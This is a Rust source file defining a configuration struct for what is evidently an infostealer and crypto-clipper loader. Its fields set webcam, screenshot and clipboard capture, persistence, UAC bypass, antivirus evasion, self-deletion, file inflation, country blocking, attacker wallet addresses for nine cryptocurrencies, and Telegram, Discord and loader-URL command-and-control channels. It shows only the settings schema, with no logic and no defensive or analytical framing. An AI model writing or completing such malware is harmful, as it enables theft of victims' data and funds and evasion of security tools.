use serde::{Deserialize, Serialize};
use std::collections::HashSet;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LoaderConfig {
    pub allowed_categories: Option<HashSet<String>>,
    pub artifact_key: Option<String>,
    pub capture_screenshots: Option<bool>,
    pub capture_webcams: Option<bool>,
    pub capture_clipboard: Option<bool>,
    pub persistence_enabled: Option<bool>,
    pub uac_bypass_enabled: Option<bool>,
    pub evasion_enabled: Option<bool>,
    pub clipper_enabled: Option<bool>,
    pub melt_enabled: Option<bool>,
    
    // Crypto
    pub btc_address: Option<String>,
    pub eth_address: Option<String>,
    pub ltc_address: Option<String>,
    pub xmr_address: Option<String>,
    pub doge_address: Option<String>,
    pub dash_address: Option<String>,
    pub sol_address: Option<String>,
    pub trx_address: Option<String>,
    pub ada_address: Option<String>,

    // Network / C2
    pub telegram_token: Option<String>,
    pub telegram_chat_id: Option<String>,
    pub discord_webhook: Option<String>,
    pub loader_url: Option<String>,
    pub proxy_server: Option<String>,

    // Other
    pub pump_size_mb: Option<u32>,
    pub blocked_countries: Option<HashSet<String>>,
    pub custom_extensions: Option<HashSet<String>>,
    pub custom_keywords: Option<HashSet<String>>,
}
